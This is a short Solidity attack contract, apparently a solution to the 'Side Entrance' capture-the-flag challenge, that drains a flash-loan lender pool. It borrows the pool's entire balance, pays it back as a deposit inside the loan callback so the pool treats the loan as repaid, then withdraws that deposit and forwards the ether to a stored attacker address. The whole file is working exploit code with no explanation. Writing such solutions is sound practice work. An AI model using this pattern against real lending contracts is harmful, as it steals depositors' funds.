// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "./SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver {
    ISideEntranceLenderPool public poolContract;
    address public attacker;

    constructor(address poolAddr) {
        poolContract = ISideEntranceLenderPool(poolAddr);
        attacker = msg.sender;
    }

    function callFlashLoan() external {
        poolContract.flashLoan(address(poolContract).balance);
    }

    function execute() external payable {
        poolContract.deposit{value: msg.value}();
    }

    function callWithdraw() external {
        poolContract.withdraw();
    }

    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}
